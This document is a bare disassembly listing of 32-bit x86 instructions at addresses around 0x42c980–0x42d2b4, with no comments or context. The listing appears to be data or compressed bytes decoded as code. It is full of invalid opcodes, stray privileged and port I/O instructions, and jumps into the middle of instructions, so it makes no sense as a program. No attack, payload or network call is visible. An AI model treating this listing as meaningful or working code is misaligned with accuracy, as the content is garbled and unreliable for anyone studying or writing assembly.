  42c980:	call   FWORD PTR [esi+0x51e84622]
  42c986:	retf   0xf403
  42c989:	test   eax,0x82acf0ee
  42c98e:	add    DWORD PTR [ecx],eax
  42c990:	out    dx,eax
  42c991:	ja     0x42c9bb
  42c993:	cmp    dh,BYTE PTR [ebp-0x5c]
  42c996:	adc    al,0x0
  42c998:	hlt    
  42c999:	add    al,0x66
  42c99b:	ret    0x8bf6
  42c99e:	xor    al,0xb0
  42c9a0:	ror    DWORD PTR [ecx],cl
  42c9a2:	mov    ds:0xd204af41,eax
  42c9a7:	xor    DWORD PTR [ebp+ebp*4+0x389a],esp
	...
  42c9c2:	add    BYTE PTR [eax],al
  42c9c4:	add    ah,dh
  42c9c6:	add    al,0x66
  42c9c8:	sub    DWORD PTR [eax+0x2b4a1a05],esp
  42c9ce:	sbb    DWORD PTR [eax],eax
  42c9d0:	loopne 0x42ca30
  42c9d2:	sbb    ah,dh
  42c9d4:	scas   al,BYTE PTR es:[edi]
  42c9d5:	in     eax,0xd4
  42c9d7:	adc    DWORD PTR [ecx],ebp
  42c9d9:	lock xchg BYTE PTR [ebp-0x62],al
  42c9dd:	mov    cl,0x5f
  42c9df:	adc    al,0xe9
  42c9e1:	lds    esi,FWORD PTR [ecx]
  42c9e3:	in     ax,0xdc
  42c9e6:	adc    al,0x40
  42c9e8:	es (bad) 
  42c9ea:	adc    eax,eax
  42c9ec:	xchg   ecx,eax
  42c9ed:	(bad)  
  42c9ee:	push   eax
  42c9ef:	add    cl,ch
  42c9f1:	sahf   
  42c9f2:	adc    esp,eax
  42c9f4:	sub    DWORD PTR [esi+0x51],0xd38ee900
  42c9fb:	out    0x76,eax
  42c9fd:	in     al,dx
  42c9fe:	add    al,0x0
  42ca00:	push   0x36
  42ca02:	or     DWORD PTR [ebx-0x2c],ecx
  42ca05:	pop    edx
  42ca06:	cmp    bl,BYTE PTR [edx+0x2a]
  42ca09:	ret    
  42ca0a:	rol    DWORD PTR [ebx],0x7d
  42ca0d:	xchg   edx,eax
  42ca0e:	inc    esp
  42ca0f:	add    dl,bh
  42ca11:	cmp    dh,BYTE PTR [ebx]
  42ca13:	mov    DWORD PTR [esi-0xaa47301],ecx
  42ca19:	ss inc edx
  42ca1b:	add    al,0x35
  42ca1d:	jb     0x42ca64
  42ca1f:	add    BYTE PTR [ecx-0x16bfd239],al
  42ca25:	pop    esp
  42ca26:	inc    edx
  42ca27:	adc    al,0x71
	...
  42ca41:	add    BYTE PTR [edi],ch
  42ca43:	add    DWORD PTR [ecx+0x5b8cd79e],ecx
  42ca49:	int    0x48
  42ca4b:	cmp    ch,BYTE PTR [eax]
  42ca4d:	cdq    
  42ca4e:	mov    ch,0x41
  42ca50:	adc    dh,ah
  42ca52:	mov    ?,edi
  42ca54:	iret   
  42ca55:	sti    
  42ca56:	aaa    
  42ca57:	add    eax,0x55cc5e8d
  42ca5c:	mov    ds:0xe804f7e9,eax
  42ca61:	add    BYTE PTR [eax+edi*4],dl
  42ca64:	idiv   edi
  42ca66:	add    al,0xd3
  42ca68:	and    ebx,DWORD PTR [esi+0x14]
  42ca6b:	dec    ebx
  42ca6c:	sub    dh,al
  42ca6e:	fimul  DWORD PTR [ecx+eax*1]
  42ca71:	(bad)  
  42ca72:	retf   0x35a8
  42ca75:	add    BYTE PTR [ebp+0x1],bl
  42ca78:	add    edi,0x26
  42ca7b:	(bad)  
  42ca7c:	dec    edi
  42ca7d:	mov    eax,DWORD PTR [ecx+edi*2+0x14d000b]
  42ca84:	out    dx,al
  42ca85:	inc    esp
  42ca86:	cmp    DWORD PTR [ecx+0x325b7400],ebx
  42ca8c:	call   0x4babb1
  42ca91:	mov    ecx,DWORD PTR [edx]
  42ca93:	dec    ebx
  42ca94:	mov    edx,0x83341d04
  42ca99:	in     al,dx
  42ca9a:	ins    BYTE PTR es:[edi],dx
  42ca9b:	cmp    BYTE PTR [ebx+0x65],bh
  42ca9e:	mov    cl,0x1
  42caa0:	jnp    0x42cb21
  42caa2:	and    DWORD PTR [ecx],eax
  42caa4:	dec    esi
  42caa5:	mov    DWORD PTR [eax],0x0
	...
  42cabf:	sbb    ah,BYTE PTR ds:0xd31d4082
  42cac5:	dec    edx
  42cac6:	push   ebx
  42cac7:	xchg   esi,eax
  42cac8:	inc    edx
  42cac9:	or     BYTE PTR [ebx+0x348d6540],cl
  42cacf:	gs sbb edi,esi
  42cad2:	xor    ah,BYTE PTR [esi]
  42cad4:	test   eax,0xa8b0853
  42cad9:	mov    DWORD PTR [ebp-0xb],ebx
  42cadc:	sbb    al,BYTE PTR [eax+0x4]
  42cadf:	fiadd  WORD PTR [ebp-0x8]
  42cae2:	call   0x3a3a97
  42cae7:	push   esi
  42cae8:	push   es
  42cae9:	jnp    0x42cb30
  42caeb:	aad    0xe1
  42caed:	cmp    bh,BYTE PTR [ebx]
  42caef:	xor    eax,0xf4e96d99
  42caf4:	es out dx,al
  42caf6:	test   BYTE PTR [edx+0x22fb1032],ch
  42cafc:	stos   BYTE PTR es:[edi],al
  42cafd:	rol    BYTE PTR [edx],0xbc
  42cb00:	sbb    BYTE PTR [eax+eax*1-0x64],al
  42cb04:	outs   dx,DWORD PTR ds:[esi]
  42cb05:	cmp    eax,0x9bf3f400
  42cb0a:	mov    ebp,0xfaffae2f
  42cb0f:	mov    ecx,0x68457d79
  42cb14:	mov    bh,0x40
  42cb16:	or     al,0xe6
  42cb18:	fimul  DWORD PTR [ebp+ecx*4-0x1d]
  42cb1c:	mov    eax,ds:0x1c782e97
  42cb21:	test   eax,0xfb
	...
  42cb3a:	add    BYTE PTR [eax],al
  42cb3c:	ret    
  42cb3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cb3e:	rol    BYTE PTR [ebx-0x8],0x71
  42cb42:	jp     0x42cb84
  42cb44:	hlt    
  42cb45:	xor    eax,0xadf4478a
  42cb4a:	rol    BYTE PTR [ebx],0xe8
  42cb4d:	mov    ecx,0xe4c2003f
  42cb52:	les    edx,FWORD PTR [ebp+0x6f]
  42cb55:	xor    cl,BYTE PTR [edi+0x66]
  42cb58:	add    BYTE PTR [esi],dh
  42cb5a:	push   ds
  42cb5b:	inc    edi
  42cb5c:	hlt    
  42cb5d:	lods   eax,DWORD PTR ds:[esi]
  42cb5e:	jp     0x42cb20
  42cb60:	mov    BYTE PTR [esi-0x520f9f7c],bh
  42cb66:	test   BYTE PTR [eax-0x4],ah
  42cb69:	lods   eax,DWORD PTR ds:[esi]
  42cb6a:	rol    BYTE PTR [eax],0xbc
  42cb6d:	daa    
  42cb6e:	inc    esp
  42cb6f:	add    BYTE PTR [ebp+0x60],ch
  42cb72:	mov    ds:0x1b2ef0e7,eax
  42cb77:	cld    
  42cb78:	hlt    
  42cb79:	cs and edi,esp
  42cb7c:	hlt    
  42cb7d:	jnp    0x42cbaa
  42cb7f:	pusha  
  42cb80:	outs   dx,DWORD PTR ds:[esi]
  42cb81:	(bad)
  42cb86:	ins    BYTE PTR es:[edi],dx
  42cb87:	push   DWORD PTR [ebx+0x2776e99b]
  42cb8d:	or     eax,0x4ec89c39
  42cb92:	jmp    0x3e073b9a
  42cb97:	fdivr  DWORD PTR [edx+0xa]
  42cb9a:	dec    edi
  42cb9b:	add    BYTE PTR [ecx+0x41],bh
  42cb9e:	mov    ch,0x53
	...
  42cbb8:	add    BYTE PTR [ebx+0x43],bh
  42cbbb:	fnsave [esi-0x10]
  42cbbe:	test   DWORD PTR [ecx],edi
  42cbc0:	test   eax,0x43f34909
  42cbc5:	hlt    
  42cbc6:	(bad)  
  42cbca:	or     ah,BYTE PTR [esi-0x41]
  42cbcd:	call   0xb4c5c15b
  42cbd2:	lea    esp,[edx]
  42cbd4:	clc    
  42cbd5:	jo     0x42cba4
  42cbd7:	std    
  42cbd8:	call   DWORD PTR [ebx+0x73087e05]
  42cbde:	inc    ecx
  42cbdf:	gs jl  0x42cc06
  42cbe2:	sub    DWORD PTR [ecx],0xdb9c002f
  42cbe8:	push   DWORD PTR [esi]
  42cbea:	add    al,0x21
  42cbec:	jge    0x42cba2
  42cbee:	add    al,0x51
  42cbf0:	std    
  42cbf1:	mov    edx,0x1c51e904
  42cbf6:	add    BYTE PTR [esi+0x28d6f403],bl
  42cbfc:	dec    ecx
  42cbfd:	sub    eax,0xe07cbcc7
  42cc02:	xchg   BYTE PTR ds:0xe5487317,cl
  42cc08:	push   esp
  42cc09:	inc    esi
  42cc0a:	xor    al,BYTE PTR [ecx]
  42cc0c:	adc    al,0xeb
  42cc0e:	add    al,0xe9
  42cc10:	jp     0x42cc4b
  42cc12:	popf   
  42cc13:	fs ret 
  42cc15:	dec    DWORD PTR [edx+0x4f65a00]
  42cc1b:	add    BYTE PTR [edx+0x0],ah
	...
  42cc36:	cli    
  42cc37:	or     al,0x7f
  42cc39:	popa   
  42cc3a:	lods   al,BYTE PTR ds:[esi]
  42cc3b:	add    eax,0x42a6b0b
  42cc40:	add    cl,ch
  42cc42:	jbe    0x42cc64
  42cc44:	cwde   
  42cc45:	jmp    0x44d026f0
  42cc4a:	jl     0x42ccae
  42cc4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cc4d:	push   ebx
  42cc4e:	and    BYTE PTR [edx-0x73],ah
  42cc51:	sub    al,0x20
  42cc53:	and    eax,DWORD PTR [eax]
  42cc55:	sbb    DWORD PTR [eax+0x5d],ebx
  42cc58:	cmp    eax,ebp
  42cc5a:	neg    DWORD PTR [ecx]
  42cc5c:	(bad)  
  42cc5d:	in     eax,dx
  42cc5e:	test   eax,0xcee9fb40
  42cc63:	popf   
  42cc64:	add    cl,ch
  42cc66:	neg    DWORD PTR [ebp+0x3fcef575]
  42cc6c:	clc    
  42cc6d:	xchg   ecx,eax
  42cc6e:	pop    ss
  42cc6f:	jmp    0x42cc70
  42cc71:	call   0x6e9020c0
  42cc76:	mov    ebp,0xb1818d10
  42cc7b:	push   es
  42cc7c:	test   DWORD PTR [ecx],ebp
  42cc7e:	and    eax,DWORD PTR [esi+0x4f7e83c]
  42cc84:	xchg   DWORD PTR [edi+ecx*2-0x4f8b8378],esp
  42cc8b:	cdq    
  42cc8c:	mov    ebx,0x740588b0
  42cc91:	push   es
  42cc92:	rcl    DWORD PTR [eax],0x1e
  42cc95:	mov    al,ds:0xdffad3c4
	...
  42ccb2:	add    BYTE PTR [edx+0x37f5c3ef],bl
  42ccb8:	add    eax,0x56eaef87
  42ccbd:	add    dl,cl
  42ccbf:	mov    dh,0x34
  42ccc1:	sti    
  42ccc2:	add    BYTE PTR [eax-0x22bfeb3b],dh
  42ccc8:	push   ds
  42ccc9:	push   es
  42ccca:	and    ecx,DWORD PTR [esi]
  42cccc:	sti    
  42cccd:	mov    BYTE PTR [ecx],al
  42cccf:	div    dh
  42ccd1:	div    BYTE PTR [esi]
  42ccd3:	call   0xe300:0xdd14c3f4
  42ccda:	or     dl,cl
  42ccdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ccdd:	not    BYTE PTR ds:0x40094d
  42cce3:	sbb    eax,0xc100f6ed
  42cce8:	lahf   
  42cce9:	div    BYTE PTR [edi]
  42cceb:	dec    edx
  42ccec:	aam    0xb
  42ccee:	inc    DWORD PTR [ebx+0x73581562]
  42ccf4:	inc    ebp
  42ccf5:	add    BYTE PTR [ebx-0x3f7b6e6f],al
  42ccfb:	add    BYTE PTR [esi+esi*8+0x45af7536],bl
  42cd02:	add    BYTE PTR [ebp-0x7a],bl
  42cd05:	push   ds
  42cd06:	add    dh,bl
  42cd08:	mov    edx,0x6210fdfb
  42cd0d:	cmp    BYTE PTR [ebp-0x36],0x99
  42cd11:	push   es
  42cd12:	add    BYTE PTR [edi+0x62],0xf7
  42cd16:	inc    DWORD PTR [eax]
	...
  42cd30:	cwde   
  42cd31:	aam    0x97
  42cd33:	(bad)  
  42cd34:	push   eax
  42cd35:	xchg   ecx,eax
  42cd36:	(bad)  
  42cd37:	dec    DWORD PTR ds:0xa0068305
  42cd3d:	lds    esi,FWORD PTR [esp+ebx*2-0x68]
  42cd41:	fild   QWORD PTR [edi]
  42cd43:	mov    ebp,DWORD PTR [edx+0x65]
  42cd46:	dec    edi
  42cd47:	shl    DWORD PTR [esi-0x2295afca],1
  42cd4d:	jl     0x42cdc4
  42cd4f:	out    dx,eax
  42cd50:	or     bl,BYTE PTR [edi-0x77]
  42cd53:	inc    edi
  42cd54:	hlt    
  42cd55:	std    
  42cd56:	jg     0x42cd18
  42cd58:	popa   
  42cd59:	lods   al,BYTE PTR ds:[esi]
  42cd5a:	in     al,0x2
  42cd5c:	jg     0x42cd1e
  42cd5e:	jbe    0x42cd1f
  42cd60:	jno    0x42cd45
  42cd62:	sub    eax,DWORD PTR [edi]
  42cd64:	outs   dx,DWORD PTR ds:[esi]
  42cd65:	fist   WORD PTR [esi-0x5219fe]
  42cd6b:	test   BYTE PTR [esi+eiz*1+0x21bd2f10],dh
  42cd72:	les    edi,FWORD PTR [edx-0x34]
  42cd75:	inc    edi
  42cd76:	cmp    DWORD PTR [ebx+ebp*1],0x35032d47
  42cd7d:	add    edi,DWORD PTR [esp+edi*2-0x72f94c80]
  42cd84:	add    bh,dh
  42cd86:	dec    esp
  42cd87:	dec    edi
  42cd88:	jnp    0x42cd1a
  42cd8a:	pop    ss
  42cd8b:	jmp    0xe8427c01
  42cd90:	and    BYTE PTR [edi+0xfba5],al
	...
  42cdaa:	add    BYTE PTR [eax],al
  42cdac:	add    BYTE PTR [ebp-0x18],ch
  42cdaf:	inc    ebx
  42cdb0:	test   DWORD PTR [ecx+esi*8],esi
  42cdb3:	std    
  42cdb4:	and    bl,bh
  42cdb6:	sub    bh,BYTE PTR [edx-0x816b4fc]
  42cdbc:	je     0x42ce28
  42cdbe:	and    edi,DWORD PTR [ebx]
  42cdc0:	or     BYTE PTR [edi-0x1a],ch
  42cdc3:	test   DWORD PTR [esi+0x7c7895b4],0x43793a7c
  42cdcd:	in     al,dx
  42cdce:	ins    DWORD PTR es:[edi],dx
  42cdcf:	sbb    al,al
  42cdd1:	xchg   esp,eax
  42cdd2:	cmp    BYTE PTR ds:0xf335a404,ch
  42cdd8:	dec    eax
  42cdd9:	hlt    
  42cdda:	lods   eax,DWORD PTR ds:[esi]
  42cddb:	jnp    0x42cd9d
  42cddd:	mov    bh,bh
  42cddf:	adc    eax,0x87616960
  42cde4:	push   eax
  42cde5:	jg     0x42cdeb
  42cde7:	stos   BYTE PTR es:[edi],al
  42cde8:	sti    
  42cde9:	push   edx
  42cdea:	lds    ecx,FWORD PTR [ecx+0x1234f600]
  42cdf0:	movaps xmm5,xmm7
  42cdf3:	test   al,0x3
  42cdf5:	jnp    0x42ce36
  42cdf7:	icebp  
  42cdf8:	js     0x42cdb6
  42cdfa:	sub    esi,DWORD PTR [eax]
  42cdfc:	and    al,0x43
  42cdfe:	shl    ebp,0x0
  42ce01:	out    dx,al
  42ce02:	mov    DWORD PTR [ecx-0xec082fe],ebp
  42ce08:	das    
  42ce09:	lock push esp
  42ce0b:	call   0x2cccc8a8
  42ce10:	mov    WORD PTR [eax],es
	...
  42ce2a:	mov    WORD PTR [edx-0x33],?
  42ce2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ce2e:	(bad)  
  42ce2f:	shr    BYTE PTR [eax-0x4fc3d1bc],cl
  42ce35:	shr    esp,0x4
  42ce38:	aas    
  42ce39:	or     BYTE PTR [edx*4-0x530bbecb],cl
  42ce40:	gs out 0xf4,eax
  42ce43:	add    al,0x66
  42ce45:	push   ds
  42ce46:	pusha  
  42ce47:	add    al,0x66
  42ce49:	push   ds
  42ce4a:	push   esp
  42ce4b:	add    al,0x5e
  42ce4d:	ds cld 
  42ce4f:	mov    esi,DWORD PTR [esp+eiz*4]
  42ce52:	add    ecx,DWORD PTR [ebp-0x13]
  42ce55:	hlt    
  42ce56:	ret    0xe9be
  42ce59:	add    esi,esp
  42ce5b:	mov    ebp,DWORD PTR [ecx]
  42ce5d:	cld    
  42ce5e:	add    BYTE PTR [eax],0x71
  42ce61:	jp     0x42ce14
  42ce63:	mov    al,0x16
  42ce65:	scas   al,BYTE PTR es:[edi]
  42ce66:	ins    DWORD PTR es:[edi],dx
  42ce67:	adc    DWORD PTR ds:0xa08bec78,esi
  42ce6d:	sti    
  42ce6e:	jl     0x42ceb9
  42ce70:	and    DWORD PTR [esi+0x3d],edi
  42ce73:	pop    es
  42ce74:	gs mov dh,ah
  42ce77:	add    al,0x0
  42ce79:	jmp    0xdf1ade8a
  42ce7e:	je     0x42ce05
  42ce80:	add    cl,ch
  42ce82:	idiv   DWORD PTR [ebp+0x0]
  42ce85:	xchg   edx,eax
  42ce86:	xchg   ecx,eax
  42ce87:	and    eax,0xc4db98ff
  42ce8c:	inc    ebp
  42ce8d:	push   es
	...
  42cea6:	add    bh,dh
  42cea8:	test   BYTE PTR [ebp+0xe],bh
  42ceab:	retf   
  42ceac:	daa    
  42cead:	pop    ebp
  42ceae:	out    dx,al
  42ceaf:	push   ecx
  42ceb0:	sbb    bl,ah
  42ceb2:	bound  esi,QWORD PTR [ebx]
  42ceb4:	pop    ebx
  42ceb5:	adc    BYTE PTR [esp+edi*4+0x1b],ah
  42ceb9:	push   cs
  42ceba:	out    0xcc,al
  42cebc:	pop    esp
  42cebd:	sti    
  42cebe:	push   esp
  42cebf:	test   al,0x7f
  42cec1:	inc    ebp
  42cec2:	in     eax,0x4f
  42cec4:	mov    ecx,0x7ff7e949
  42cec9:	sar    BYTE PTR [ebx+ebp*4],0x7f
  42cecd:	pop    esp
  42cece:	jg     0x42ce78
  42ced0:	adc    edi,0x749b8337
  42ced6:	outs   dx,DWORD PTR ds:[esi]
  42ced7:	pop    eax
  42ced8:	fwait
  42ced9:	jne    0x42ced4
  42cedb:	jp     0x42cf1d
  42cedd:	or     al,0x91
  42cedf:	cmp    DWORD PTR [eax+eax*1-0x17],ecx
  42cee3:	ins    BYTE PTR es:[edi],dx
  42cee4:	lds    esi,FWORD PTR [ebp-0x37]
  42cee7:	cmp    BYTE PTR [ecx],0xba
  42ceea:	sbb    DWORD PTR [ebp-0x52],edi
  42ceed:	jp     0x42cec9
  42ceef:	xchg   esi,eax
  42cef0:	adc    DWORD PTR [edx+0x10109729],edi
  42cef6:	bound  edi,QWORD PTR [ebp-0x467017f8]
  42cefc:	add    al,0x0
  42cefe:	cmp    BYTE PTR fs:[eax],dl
  42cf01:	add    eax,0xe7a1ad57
  42cf06:	mov    BYTE PTR [eax+0x18],bh
  42cf09:	jecxz  0x42cf0b
	...
  42cf23:	add    BYTE PTR [ecx],bl
  42cf25:	out    dx,al
  42cf26:	push   es
  42cf27:	mov    ecx,DWORD PTR [eax+0x56]
  42cf2a:	mov    DWORD PTR ds:[eax],edi
  42cf2d:	push   esi
  42cf2e:	add    DWORD PTR [ebp+0x9],0x68
  42cf32:	outs   dx,DWORD PTR ds:[esi]
  42cf33:	call   DWORD PTR [edx]
  42cf35:	bound  eax,QWORD PTR [ebx+0x44b83545]
  42cf3b:	fdivr  QWORD PTR [eax+0x9]
  42cf3e:	jnp    0x42cf8d
  42cf40:	add    DWORD PTR [edx-0x50],esp
  42cf43:	add    esi,esp
  42cf45:	fwait
  42cf46:	test   BYTE PTR [ebp-0x13],0x67
  42cf4a:	sub    bh,bh
  42cf4c:	ret    0x2b62
  42cf4f:	rcr    BYTE PTR [ebp-0x42],0x83
  42cf53:	lds    edi,FWORD PTR gs:[esi+0x4d]
  42cf57:	cld    
  42cf58:	ret    0xbbaf
  42cf5b:	call   0x4384f2
  42cf60:	pop    edi
  42cf61:	add    eax,0x66065500
  42cf66:	jnp    0x42cf54
  42cf68:	sar    DWORD PTR [ebp+0x65],1
  42cf6b:	cld    
  42cf6c:	(bad)  
  42cf6d:	into   
  42cf6e:	dec    ebp
  42cf6f:	push   edi
  42cf70:	mov    ds:0x188d0bfc,al
  42cf75:	gs push eax
  42cf77:	call   0x3a025b
  42cf7c:	leave  
  42cf7d:	rol    DWORD PTR [edi],0x84
  42cf80:	jne    0x42cf83
  42cf82:	add    BYTE PTR [eax],al
  42cf84:	ror    BYTE PTR [esp+edi*8+0x50],0x0
	...
  42cfa1:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  42cfa3:	dec    ebx
  42cfa4:	inc    edx
  42cfa6:	mov    eax,es
  42cfa8:	sets   BYTE PTR [edx+0x0]
  42cfac:	add    BYTE PTR ds:0x900f4589,bl
  42cfb2:	dec    esp
  42cfb3:	mov    eax,0x4820f450
  42cfb8:	cld    
  42cfb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cfba:	inc    ebx
  42cfbb:	adc    BYTE PTR [eax+0xb],0x3e
  42cfbf:	mov    al,al
  42cfc1:	repz and BYTE PTR [ebp+0x0],bh
  42cfc5:	hlt    
  42cfc6:	stos   DWORD PTR es:[edi],eax
  42cfc7:	mov    cl,BYTE PTR [ebp-0x3c]
  42cfca:	daa    
  42cfcb:	dec    eax
  42cfcc:	aam    0x75
  42cfce:	(bad)  
  42cfd0:	cli    
  42cfd1:	jecxz  0x42cfc6
  42cfd3:	adc    eax,0xbbf21db
  42cfd9:	jnp    0x42cffa
  42cfdb:	(bad)  
  42cfdc:	push   esp
  42cfde:	sysret 
  42cfe0:	cmp    DWORD PTR [ebp-0xb646162],0x398d1c12
  42cfea:	mov    ds:0xcd4ee82e,al
  42cfef:	mov    al,ds:0x135e79fb
  42cff4:	ins    BYTE PTR es:[edi],dx
  42cff5:	fwait
  42cff6:	xor    DWORD PTR [eax+ebp*8+0x3eb44],esi
  42cffd:	jg     0x42d065
  42cfff:	adc    edi,0x8
  42d002:	jecxz  0x42cf90
  42d004:	jge    0x42d006
	...
  42d01e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d01f:	daa    
  42d020:	xchg   ebp,eax
  42d021:	mov    eax,0xffffadf4
  42d026:	das    
  42d027:	mov    cx,WORD PTR [ebp+0x5c]
  42d02b:	int    0x10
  42d02d:	inc    edx
  42d02e:	xor    ecx,esi
  42d030:	xor    eax,0x3481b98d
  42d035:	call   0xfbe3bdca
  42d03a:	jns    0x42d09a
  42d03c:	adc    esp,DWORD PTR [ebx]
  42d03e:	not    DWORD PTR [eax+0x15b12797]
  42d044:	xlat   BYTE PTR ds:[ebx]
  42d045:	inc    esp
  42d046:	sub    al,0x5
  42d048:	jecxz  0x42d051
  42d04a:	jns    0x42cfe0
  42d04c:	aam    0xb7
  42d04e:	rcl    DWORD PTR [edi+0x1a7dc416],cl
  42d054:	push   ebp
  42d055:	xchg   DWORD PTR [edx+ebx*1],esi
  42d058:	hlt    
  42d059:	cmp    DWORD PTR [ebx+0xc0bb493],esi
  42d05f:	shl    BYTE PTR [edx],cl
  42d061:	mov    eax,ds:0x10a47cef
  42d066:	cmp    ebx,DWORD PTR [ebp+0x4f4489e]
  42d06c:	ins    BYTE PTR es:[edi],dx
  42d06d:	inc    edi
  42d06e:	fdiv   DWORD PTR [ecx+eax*1]
  42d071:	repnz and al,0x94
  42d074:	or     al,BYTE PTR [ecx+ecx*2-0x1ae916fc]
  42d07b:	and    DWORD PTR [edi+ebx*4+0x513b9d24],0x0
	...
  42d09a:	add    BYTE PTR [edi-0x3b9b6d],ch
  42d0a0:	mov    BYTE PTR [ecx],ch
  42d0a2:	mov    eax,ds:0x1e66939f
  42d0a7:	cwde   
  42d0a8:	add    al,0x5d
  42d0aa:	or     eax,DWORD PTR [ecx-0x63cc32b7]
  42d0b0:	loop   0x42d0e3
  42d0b2:	mov    eax,ds:0x11247e7f
  42d0b7:	xchg   ebx,eax
  42d0b8:	cmc    
  42d0b9:	gs push ds
  42d0bb:	jo     0x42d0c1
  42d0bd:	xor    eax,0xa549790b
  42d0c2:	xor    ecx,DWORD PTR [esi+ebp*8+0x29]
  42d0c6:	mov    eax,ds:0x40a8d65f
  42d0cb:	scas   al,BYTE PTR es:[edi]
  42d0cc:	das    
  42d0cd:	mov    al,ds:0x1c04fcc5
  42d0d2:	lea    edx,[eax-0x79]
  42d0d5:	lea    ecx,[edi]
  42d0d7:	stos   DWORD PTR es:[edi],eax
  42d0d8:	cmp    al,BYTE PTR [eax]
  42d0da:	push   ds
  42d0db:	dec    ecx
  42d0dc:	mov    ss,WORD PTR [ebx+0x16]
  42d0df:	ficom  DWORD PTR [ebx+0x1cecd352]
  42d0e5:	add    cl,ch
  42d0e7:	test   DWORD PTR [ebx+edi*8-0x2773fc24],0x898cea60
  42d0f2:	les    esp,FWORD PTR [ebx-0x71]
  42d0f5:	adc    eax,0xffd301a9
  42d0fa:	pop    edi
  42d0fb:	cmp    bl,BYTE PTR [ecx+0x317f]
	...
  42d115:	add    BYTE PTR [eax],al
  42d117:	add    BYTE PTR [ecx+ebx*1+0x4872b92f],dl
  42d11e:	hlt    
  42d11f:	mov    ecx,0x17fa908f
  42d124:	xchg   esp,eax
  42d125:	mov    eax,eax
  42d127:	xchg   esp,eax
  42d128:	xor    DWORD PTR [esi-0x79c028b],ecx
  42d12e:	add    ebx,edx
  42d130:	aaa    
  42d131:	add    eax,0x19937439
  42d136:	or     esi,ebp
  42d138:	add    DWORD PTR [ecx+0x32bfcfb],edx
  42d13e:	inc    eax
  42d13f:	jmp    0x5e3ae2fc
  42d144:	add    DWORD PTR [esi-0x7942e8b],ecx
  42d14a:	add    ebx,edx
  42d14c:	aaa    
  42d14d:	add    eax,0x195c3c39
  42d152:	or     ebp,DWORD PTR [edx+0x15]
  42d155:	cdq    
  42d156:	sti    
  42d157:	xor    eax,0x9d758df9
  42d15c:	cmp    eax,0x3
  42d15f:	cli    
  42d160:	mov    bh,0x4
  42d162:	cs test eax,0xa0572f13
  42d168:	ss std 
  42d16a:	(bad)  
  42d16b:	inc    esi
  42d16d:	inc    ebp
  42d16e:	and    BYTE PTR [ebx+0x400a1a80],cl
  42d174:	sbb    eax,0x640c4581
  42d179:	in     eax,0xfb
  42d17b:	je     0x42d17d
	...
  42d195:	adc    BYTE PTR [ebx+0x75],dh
  42d198:	cld    
  42d199:	mov    edx,0x1975f75a
  42d19e:	fisttp DWORD PTR [esi+0x6a]
  42d1a1:	adc    DWORD PTR [ebx+0x75],esi
  42d1a4:	clc    
  42d1a5:	mov    edx,0x4d12938b
  42d1aa:	push   es
  42d1ab:	mov    DWORD PTR [ebp+0x29],eax
  42d1ae:	scas   al,BYTE PTR es:[edi]
  42d1af:	mov    esi,0x6b717574
  42d1b4:	and    BYTE PTR [ebp+0x5087572],bl
  42d1ba:	mov    ds:0x71eafffc,al
  42d1bf:	jne    0x42d1bd
  42d1c1:	push   edi
  42d1c2:	push   ecx
  42d1c3:	not    esi
  42d1c5:	inc    esi
  42d1c6:	lods   al,BYTE PTR ds:[esi]
  42d1c7:	call   DWORD PTR [edx]
  42d1c9:	lea    eax,ds:0xf9a57d39
  42d1cf:	add    al,0xff
  42d1d1:	and    BYTE PTR [esi-0x9],ch
  42d1d4:	(bad)  
  42d1d5:	aam    0xe3
  42d1d7:	repz je 0x42d180
  42d1da:	xchg   BYTE PTR [ebp-0xc],bh
  42d1dd:	stos   BYTE PTR es:[edi],al
  42d1de:	stc    
  42d1df:	add    al,0xff
  42d1e1:	and    BYTE PTR [ebp-0x9],ch
  42d1e4:	(bad)  
  42d1e5:	pop    es
  42d1e6:	(bad)  
  42d1e7:	jecxz  0x42d17e
  42d1e9:	jecxz  0x42d1c4
  42d1eb:	xor    cl,0xaa
  42d1ee:	mov    ebx,gs
  42d1f0:	adc    bl,BYTE PTR ds:0x86f88309
  42d1f6:	mov    bl,0x2a
  42d1f8:	rol    BYTE PTR [eax],0x0
	...
  42d20f:	add    BYTE PTR [eax],al
  42d211:	add    BYTE PTR ds:0xf485e056,cl
  42d217:	bound  edx,QWORD PTR [ebx]
  42d219:	sub    edx,edx
  42d21b:	mov    dl,0x5d
  42d21d:	leave  
  42d21e:	jno    0x42d201
  42d220:	in     eax,dx
  42d221:	popa   
  42d222:	ja     0x42d280
  42d224:	inc    esp
  42d225:	push   eax
  42d226:	call   0xf114:0x1fb0724
  42d22d:	aas    
  42d22e:	hlt    
  42d22f:	push   ds
  42d230:	xchg   edi,eax
  42d231:	jmp    DWORD PTR [edi-0x7078104]
  42d237:	scas   eax,DWORD PTR es:[edi]
  42d238:	sti    
  42d239:	jle    0x42d247
  42d23b:	popf   
  42d23c:	sbb    BYTE PTR ds:0x7cef61bc,al
  42d242:	out    0xd1,al
  42d244:	inc    esp
  42d245:	adc    BYTE PTR [esi+0x68],bh
  42d248:	out    dx,eax
  42d249:	jg     0x42d238
  42d24b:	mov    ah,0x1b
  42d24d:	mov    edi,0x5a39de26
  42d252:	mov    dh,0xaa
  42d254:	inc    DWORD PTR [esi-0x72f43dc8]
  42d25a:	cmp    cl,BYTE PTR [esp+ecx*4+0x4d18f848]
  42d261:	sbb    al,0x7
  42d263:	cwde   
  42d264:	lds    eax,FWORD PTR [eax-0x4]
  42d267:	mov    al,ds:0x52f4ffff
  42d26c:	int    0x75
  42d26e:	stc    
  42d26f:	adc    al,0x14
  42d271:	adc    al,0x8f
  42d273:	pop    es
  42d274:	xchg   DWORD PTR [eax+0x0],ecx
	...
  42d28f:	add    BYTE PTR [ebx],ah
  42d291:	inc    edi
  42d292:	or     bh,al
  42d294:	dec    ebx
  42d295:	fxch   st(1)
  42d297:	or     BYTE PTR [ebp-0x273ac6db],ch
  42d29d:	add    al,0x3e
  42d29f:	ficom  DWORD PTR [esi+ecx*1-0x7f571802]
  42d2a6:	shl    esi,0x4
  42d2a9:	mov    gs,WORD PTR [ebp-0x3b06ca93]
  42d2af:	mov    ah,0xf8
  42d2b1:	out    0x3,eax
  42d2b3:	hlt    
  42d2b4:	add    al,0x59
